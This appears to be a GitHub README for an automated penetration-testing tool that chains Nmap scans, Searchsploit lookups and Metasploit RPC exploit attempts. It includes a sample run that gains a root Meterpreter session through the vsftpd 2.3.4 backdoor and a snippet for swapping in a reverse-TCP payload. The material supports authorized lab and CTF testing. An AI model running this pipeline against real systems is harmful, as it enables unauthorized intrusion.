<img width="1181" height="857" alt="Screenshot_20260506_215458" src="https://github.com/user-attachments/assets/93d82d4d-0cf9-435b-ba1f-dcc66d9bb72f" />
🔍 AutoPwn Scanner

Automated vulnerability scanning and exploitation pipeline for authorized lab environments.
C++ CLI · Python logic · Metasploit RPC · SQLite reporting

Show Image
Show Image
Show Image
Show Image
Show Image


⚠️ DISCLAIMER — ETHICAL AND LEGAL USE ONLY
This tool was developed exclusively for academic lab environments, CTF competitions,
and networks for which you have explicit written authorization.
Unauthorized use against third-party systems is illegal under applicable computer crime laws.
The authors accept no responsibility for misuse.


Table of Contents

Overview
Architecture
Project Structure
Requirements
Installation
Configuration
CLI Reference
Workspaces
Session Monitor
Export & Reporting
Database Schema
Sample Output
Extending the Tool


Overview
AutoPwn Scanner is an offensive security pipeline that integrates three standard
penetration testing tools into a single automated workflow, wrapped in a
Metasploit-style interactive CLI written entirely in C++.
PhaseToolPurpose0ping / whoisPre-scan reachability check and recon1NmapPort scanning + service version detection2SearchsploitPublic exploit lookup for discovered services3Metasploit RPCAutomatic module loading and exploit attempts4SQLite + exportPersistent storage, CSV and HTML reports
What makes v3 different
Featurev1v2v3Interactive CLImenu-basedmsfconsole-style✓ fullRandom ASCII banners✗✓ 6 banners✓ 6 bannersTab autocomplete + history✗✓ readline✓ readlineProgress bar✗✓✓ animated braille spinnerFormatted Unicode tables✗✓✓ enhancedSection dividers✗basic✓ box-styleElapsed time per command✗✗✓Severity highlighting✗✗✓ CRIT/MED/LOWset / show options✗✓✓Workspaces✗✓✓ enhancedping pre-check✗✗✓whois recon✗✗✓export CSV / HTML✗✗✓ dark-themed HTMLhistory command✗✗✓ timestampedstatus panel✗✗✓--quiet / --version✗✗✓SIGINT handled (Ctrl+C)✗✗✓IP/CIDR validation✗✗✓Per-tool timeouts✗✓✓Session log per run✗✓✓

Architecture
┌──────────────────────────────────────────────────────────────────┐
│                  scanner_runner  (C++ v3)                         │
│                                                                   │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │  Interactive CLI  —  autopwn (workspace/target) >        │    │
│  │  readline: Tab autocomplete · ↑↓ history · SIGINT guard  │    │
│  └──────────┬──────────────────────────────────┬────────────┘    │
│             │                                  │                  │
│   ┌─────────▼──────────┐           ┌──────────▼──────────┐      │
│   │  Recon             │           │  Configuration       │      │
│   │  ping · whois      │           │  set · show · config │      │
│   └────────────────────┘           │  workspace · history │      │
│                                    │  status · export     │      │
│   ┌────────────────────┐           └─────────────────────-┘      │
│   │  NmapRunner        │                                          │
│   │  progress bar      │──▶ scan_<IP>.xml                        │
│   │  elapsed timer     │                                          │
│   └─────────┬──────────┘                                          │
│             │                                                      │
│   ┌─────────▼──────────┐                                          │
│   │  SearchsploitRunner│──▶ searchsploit_results.json             │
│   │  severity colors   │    CRIT red · MED yellow · LOW grey      │
│   └─────────┬──────────┘                                          │
│             │                                                      │
└─────────────┼────────────────────────────────────────────────────┘
              │
┌─────────────▼────────────────────────────────────────────────────┐
│                     logic_mapper.py                               │
│                                                                   │
│  NmapParser  ·  SearchsploitFilter  ·  MetasploitManager         │
│                         │                                         │
│              ┌──────────▼──────────┐                             │
│              │  MeterpreterMonitor  │  ← background thread        │
│              │  ★ banner on session │                             │
│              └──────────┬──────────┘                             │
│                         │                                         │
│              ┌──────────▼──────────┐                             │
│              │     SQLite DB        │                             │
│              │  Targets             │                             │
│              │  Vulnerabilities     │──▶ export CSV / HTML        │
│              │  Exploits_Found      │                             │
│              └─────────────────────┘                             │
└──────────────────────────────────────────────────────────────────┘

Project Structure
autopwn-scanner/
├── scanner_runner.cpp        # C++ CLI — all interaction and orchestration
├── logic_mapper.py           # Python core — XML parsing, MSF RPC, monitor
├── db_report.py              # Human-readable SQLite terminal report
├── start_msfrpcd.sh          # Helper to start the Metasploit RPC daemon
├── config.ini.example        # Configuration template (config.ini in .gitignore)
├── requirements.txt          # Python dependencies (pymetasploit3)
├── .gitignore                # Excludes config.ini, results/, binaries, logs/
├── README.md
└── results/                  # Created at runtime — excluded from git
    └── ws_<workspace>/
        ├── scan_<IP>.xml
        ├── searchsploit_results.json
        ├── export_<timestamp>.csv
        └── export_<timestamp>.html
logs/
    └── session_<timestamp>.log

Requirements
DependencyMin versionNotesOSKali Linux / Parrot / ArchAny Linux with the tools belowPython3.10+For list[dict] type hintsGCC/G++9+Must support -std=c++17Nmap7.80+With vulners NSE scriptMetasploit Framework6.xmsfconsole, msfrpcdSearchsploit / ExploitDBanysudo pacman -S exploitdb / sudo apt install exploitdbreadline (optional)anyEnables Tab + ↑↓ history in the CLIsqlite3 (optional)anyRequired for export csv

Installation
bash# 1. Clone the repository
git clone https://github.com/PIXELQUADRO07/AutoPwn-Scanner.git
cd AutoPwn-Scanner

# 2. Install Python dependency
pip install -r requirements.txt

# 3a. Compile WITHOUT readline (basic input)
g++ -o scanner_runner scanner_runner.cpp -std=c++17

# 3b. Compile WITH readline (Tab autocomplete + ↑↓ history) — recommended
sudo pacman -S readline          # Arch / Kali
# sudo apt install libreadline-dev  # Debian / Kali apt
g++ -o scanner_runner scanner_runner.cpp -std=c++17 -lreadline

# 4. Set up configuration
cp config.ini.example config.ini
nano config.ini    # set your msfrpcd password and paths

Configuration
All sensitive settings live in config.ini — never committed to Git.
ini[metasploit]
msf_password        = change_this_password
msf_host            = 127.0.0.1
msf_port            = 55553

[scanner]
output_dir          = ./results
monitor_interval    = 5      # seconds between session polls
post_pipeline_wait  = 10     # extra wait after pipeline for slow payloads

[timeouts]
timeout_nmap        = 600    # seconds; 0 = no timeout
timeout_searchsploit= 60
timeout_msf         = 120

[database]
db_path             = ./results/scanner.db

[workspace]
workspace           = default
log_dir             = ./logs
You can also change any option live inside the CLI without restarting:
autopwn (default) > set timeout_nmap 300
autopwn (default) > set workspace lab_01
autopwn (default) > show

CLI Reference
Starting the CLI
bash# Interactive mode
./scanner_runner

# Direct (non-interactive) mode
./scanner_runner <command> [args]

# Flags
./scanner_runner --quiet      # suppress verbose output
./scanner_runner --version    # print version table and exit
./scanner_runner help         # print command reference
Command Reference
CommandArgumentsDescriptionping<target>Check host reachability before scanningwhois<target>Domain / IP reconscan<target>Full pipeline: nmap → searchsploit → msfnmap<target>Run Nmap onlysessionsList active Metasploit sessionskill<session_id>Terminate a Metasploit sessionreportDisplay SQLite report in terminalexportcsv | htmlExport results to fileset<option> <value>Change any option on the flyshowShow all current options in a tableconfigInteractive configuration wizardworkspacelist|new|use|delete [name]Manage workspaceshistoryShow command history with timestampsstatusLive status panelbannerPrint a new random ASCII bannerversionVersion and build infohelpFull command referenceexitQuit
Typical workflow
autopwn (default) > ping 192.168.1.50
autopwn (default) > workspace new lab_metasploitable
autopwn (lab_metasploitable) > scan 192.168.1.50
autopwn (lab_metasploitable/192.168.1.50) > sessions
autopwn (lab_metasploitable/192.168.1.50) > export html
autopwn (lab_metasploitable/192.168.1.50) > report

Workspaces
Every scan is isolated inside a workspace folder so multiple targets
never mix data.
autopwn > workspace new lab_01        # create and switch
autopwn > workspace list              # list all with status
autopwn > workspace use lab_02        # switch to existing
autopwn > workspace delete lab_01     # delete (cannot delete 'default')
Each workspace stores its own XML, JSON, and export files under
results/ws_<name>/.

Session Monitor
MeterpreterMonitor (in logic_mapper.py) runs as a background daemon thread
during the full pipeline. When a new session opens it prints a colored banner:
╔══════════════════════════════════════════════╗
║  ★  METERPRETER SESSION                      ║
╠══════════════════════════════════════════════╣
║  Session ID : 1                              ║
║  Target     : 192.168.1.50                   ║
║  Type       : meterpreter                    ║
║  Platform   : linux / x86_64                 ║
║  User       : root                           ║
║  Module     : exploits/unix/ftp/vsftpd_234   ║
║  Time       : 14:32:07                       ║
╚══════════════════════════════════════════════╝
Session typeIconColormeterpreter★Greenshell✓Yellowother~Cyan
The session is recorded in the database even if not started by the pipeline.
After the pipeline finishes, the monitor waits post_pipeline_wait extra seconds
to catch slow staged payloads before shutting down.

Export & Reporting
Terminal report
bashautopwn > report
# or directly:
python3 db_report.py ./results/scanner.db
CSV export
autopwn > export csv
Produces results/ws_<name>/export_<timestamp>.csv with columns:
ip, hostname, port, service, version, exploit_name, has_msf, success
HTML export
autopwn > export html
Produces a self-contained dark-themed HTML page with a sortable table.
MSF-compatible exploits are highlighted in green. Open in any browser.

Database Schema
sqlTargets
  id · ip · hostname · os_info · scan_time

Vulnerabilities
  id · target_id → Targets
  port · protocol · service · version
  exploit_name · exploit_path · has_msf · found_time

Exploits_Found
  id · vuln_id → Vulnerabilities
  msf_module · rhost · rport
  session_id · success · attempt_time
Quick queries:
bash# Successful exploits
sqlite3 results/scanner.db \
  "SELECT rhost, msf_module, session_id FROM Exploits_Found WHERE success=1;"

# All MSF-ready vulnerabilities
sqlite3 results/scanner.db \
  "SELECT t.ip, v.port, v.service, v.exploit_name
   FROM Vulnerabilities v JOIN Targets t ON v.target_id=t.id
   WHERE v.has_msf=1;"

Sample Output
  ██████╗  ██╗    ██╗███╗   ██╗
  ██╔══██╗ ██║    ██║████╗  ██║
  ███████║ ██║ █╗ ██║██╔██╗ ██║
  ██╔══██║ ██║███╗██║██║╚██╗██║
  ██║  ██║ ╚███╔███╔╝██║ ╚████║
  [ Nmap · Searchsploit · Metasploit RPC · v3 ]
  workspace: lab01  |  msf: 127.0.0.1:55553  |  v3.0.0

  Type help for commands. Ctrl+C interrupts running tools.
  Tab autocomplete and ↑↓ history enabled.

autopwn (lab01) > ping 192.168.1.50

  ┌─ PING ────────────────────────────────────────────┐
[*] Testing reachability: 192.168.1.50
  ────────────────────────────────────────────────────
  PING 192.168.1.50: 4 packets transmitted, 4 received
  Completed in 4s
  ────────────────────────────────────────────────────
[+] 192.168.1.50 is reachable.

autopwn (lab01) > scan 192.168.1.50

  ┌─ NMAP SCAN ───────────────────────────────────────┐
[*] Target    : 192.168.1.50
[*] Timeout   : 600s
  ────────────────────────────────────────────────────

  Scanning 192.168.1.50     [████████████████████████░░░░░░░░░░░░░░] 63%  ⠹

  ... nmap output ...

  Scanning 192.168.1.50     [████████████████████████████████████████] DONE
  Completed in 1m 48s
[+] Scan complete → ./results/ws_lab01/scan_192.168.1.50.xml

  ┌─ SEARCHSPLOIT ────────────────────────────────────┐
  Querying exploitdb       [████████████████████████████████████████] DONE

[CRIT]  vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
[MED]   ProFTPd 1.3.3c - Compromised Source Packages
[LOW]   ProFTPd IAC 1.3.x - Remote DoS
  Completed in 3s
[+] Results → ./results/ws_lab01/searchsploit_results.json

  ┌─ LOGIC MAPPER ────────────────────────────────────┐
[*] MSF RPC: 127.0.0.1:55553
[MONITOR] Started. Polling every 5s.
  → Attempting: exploits/unix/ftp/vsftpd_234_backdoor

╔══════════════════════════════════════════════╗
║  ★  METERPRETER SESSION                      ║
║  Session ID : 1   Target: 192.168.1.50       ║
╚══════════════════════════════════════════════╝

[+] Logic mapper completed.  Completed in 12s

autopwn (lab01/192.168.1.50) > export html
[+] HTML exported → ./results/ws_lab01/export_20260513_143207.html

autopwn (lab01/192.168.1.50) > history

  ╔═══╦══════════╦══════════════════════════════╗
  ║ # ║ Time     ║ Command                      ║
  ╠═══╬══════════╬══════════════════════════════╣
  ║ 1 ║ 14:28:01 ║ ping 192.168.1.50            ║
  ║ 2 ║ 14:28:07 ║ scan 192.168.1.50            ║
  ║ 3 ║ 14:32:10 ║ export html                  ║
  ╚═══╩══════════╩══════════════════════════════╝

Extending the Tool
Custom Nmap flags — edit NmapRunner::run() in scanner_runner.cpp:
cpp// Full port scan with OS detection
"nmap -A -p- --script=vulners -oX " + xml + " " + target
Different Metasploit payload — edit MetasploitManager.run_exploit() in logic_mapper.py:
pythonpayload = self.client.modules.use("payload", "windows/x64/meterpreter_reverse_tcp")
Slack / webhook notifications — extend MeterpreterMonitor._notify():
pythonimport requests
requests.post("https://hooks.slack.com/...", json={"text": f"★ Session on {rhost}"})
Add a new CLI command — add a branch in dispatch() in scanner_runner.cpp:
cppif (cmd == "mycommand") { my_function(a1, cfg, log); return 0; }
